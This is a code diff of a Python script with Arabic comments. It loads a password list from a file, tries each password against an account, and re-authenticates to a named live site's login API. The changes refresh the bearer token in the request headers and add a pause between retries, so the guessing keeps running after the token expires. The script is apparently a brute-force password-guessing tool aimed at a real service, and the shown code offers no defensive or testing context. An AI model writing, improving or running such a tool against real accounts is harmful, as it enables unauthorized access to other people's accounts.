@@ -36,7 +36,7 @@ def load_passwords(file_path):
 
 # دالة تجربة كلمات المرور
 def try_passwords(passwords):
-    global progress, is_running, token
+    global progress, is_running, token, headers
 
     if not passwords:
         print("⚠️ لا توجد كلمات مرور للتجربة.")
@@ -74,19 +74,21 @@ def try_passwords(passwords):
 
 # دالة إعادة تسجيل الدخول
 def relogin():
-    global token
+    global token, headers
     print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
     try:
-        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
+        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', json=login_data)
         if response.status_code == 200:
             result = response.json()
             if "info" in result and "token" in result["info"]:
                 token = result["info"]["token"]
+                headers['Authorization'] = f'Bearer {token}'  # تحديث التوكن في الهيدر
                 print(f"✅ تم الحصول على التوكن الجديد: {token}")
         else:
             print(f"⚠️ فشل تسجيل الدخول. الرد: {response.json()}")
     except requests.exceptions.RequestException as e:
         print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
+        time.sleep(5)
 
 # تحميل كلمات المرور من الملف
 passwords = load_passwords('passwordss.txt')
